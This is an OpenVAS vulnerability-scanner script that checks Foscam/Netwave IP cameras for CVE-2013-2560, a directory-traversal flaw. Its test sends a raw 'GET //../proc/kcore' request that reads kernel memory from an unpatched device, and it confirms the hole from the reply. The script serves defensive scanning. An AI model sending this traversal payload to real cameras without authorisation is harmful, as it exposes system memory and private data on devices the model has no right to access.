###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_foscam_58290.nasl 11 2013-10-27 10:12:02Z jan $
#
# Foscam Prior to 11.37.2.49 Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Foscam is prone to a directory-traversal vulnerability.

Remote attackers can use specially crafted requests with directory-
traversal sequences ('../') to retrieve arbitrary files in the context
of the application. This may aid in further attacks.";


tag_solution = "Updates are available. Please see the references or vendor advisory
for more information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103679";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(58290);
 script_cve_id("CVE-2013-2560");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
 script_version ("$Revision: 11 $");

 script_name("Foscam Prior to 11.37.2.49 Directory Traversal Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/58290");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-03-15 12:24:18 +0100 (Fri, 15 Mar 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to read a local file");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if("Netwave IP Camera" >!< banner)exit(0);

soc = open_sock_tcp(port);
if(!soc)exit(0);

send(socket:soc, data: string("GET //../proc/kcore HTTP/1.0\r\n\r\n"));
recv = recv(socket:soc, length:500);

close(soc);

if("ELF" >< recv && "CORE" >< recv) {

  security_hole(port:port);
  exit(0);

}  

exit(0);

